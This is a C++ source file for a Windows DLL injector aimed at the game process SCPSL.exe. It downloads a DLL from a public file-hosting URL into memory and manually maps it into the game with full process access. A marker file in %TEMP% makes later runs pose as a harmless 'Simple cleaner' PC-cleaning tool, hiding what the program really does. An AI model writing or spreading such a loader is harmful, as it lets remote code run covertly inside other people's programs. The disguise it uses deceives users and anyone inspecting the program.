#include <Windows.h>
#include <TlHelp32.h>
#include <WinInet.h>
#include <vector>
#include <iostream>
#include <fstream>  // for file creation
#include <string>

#include "injector.h" // Assume you already have ManualMapDll() ready

#pragma comment(lib, "Wininet.lib") // Link Wininet

// Function to get %TEMP% path
std::string GetTempPathFile(const std::string& filename) {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath); // get %TEMP% path
    return std::string(tempPath) + filename;
}

// Function to get process ID by name
DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(pe32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

// Function to check architecture match
bool IsCorrectTargetArchitecture(HANDLE hProc) {
    BOOL isTargetWow64 = FALSE;
    IsWow64Process(hProc, &isTargetWow64);

    BOOL isHostWow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &isHostWow64);

    return (isTargetWow64 == isHostWow64);
}

// Function to download a file into memory
bool DownloadFileToMemory(const std::string& url, std::vector<char>& outBuffer) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hFile = InternetOpenUrlA(
        hInternet,
        url.c_str(),
        NULL,
        0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        0
    );
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        outBuffer.insert(outBuffer.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    return true;
}

int main() {
    // Setup
    const std::string tempFileName = "TMP8r47893.dlz";
    std::string tempFilePath = GetTempPathFile(tempFileName);

    // Check if the temp file exists
    if (GetFileAttributesA(tempFilePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        std::cout << "Simple cleaner\nCleaning your pc, wait a moment..." << std::endl;
        Sleep(10000);
        std::cout << "Pc Cleaned!\n";
        system("pause");
        return 0;
    }
    else {

        // Step 1: Download the DLL into memory
        std::vector<char> dllData;
        std::string dllUrl = "https://tmpfiles.org/dl/26441692/lokiscpsl.dll";

        std::cout << "Downloading DLL from URL..." << std::endl;
        if (!DownloadFileToMemory(dllUrl, dllData)) {
            std::cerr << "Failed to download DLL." << std::endl;
            return 1;
        }

        std::cout << "DLL downloaded successfully. Size: " << dllData.size() << " bytes." << std::endl;

        // Step 2: Find the SCPSL process
        const wchar_t* processName = L"SCPSL.exe";
        DWORD pid = GetProcessIdByName(processName);
        if (pid == 0) {
            std::cerr << "SCPSL.exe not found!" << std::endl;
            return 2;
        }

        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProc) {
            std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
            return 3;
        }

        if (!IsCorrectTargetArchitecture(hProc)) {
            std::cerr << "Process architecture mismatch." << std::endl;
            CloseHandle(hProc);
            return 4;
        }

        // Step 3: Inject the DLL
        std::cout << "Injecting DLL..." << std::endl;
        if (!ManualMapDll(hProc, reinterpret_cast<BYTE*>(dllData.data()), dllData.size())) {
            std::cerr << "DLL injection failed!" << std::endl;
            CloseHandle(hProc);
            return 5;
        }

        std::cout << "DLL injected successfully!" << std::endl;
        CloseHandle(hProc);

        system("cls");

        while (true) {
            std::cout << "Type '0' to hide: ";
            std::string input;
            std::getline(std::cin, input);

            if (input == "0") {
                // Create the temp file
                std::ofstream outfile(tempFilePath);
                if (outfile.is_open()) {
                    outfile.close();
                }
                std::cout << "Exiting..." << std::endl;
                break;
            }
            else {
                system("cls");
            }
        }

        return 0;
    }
}
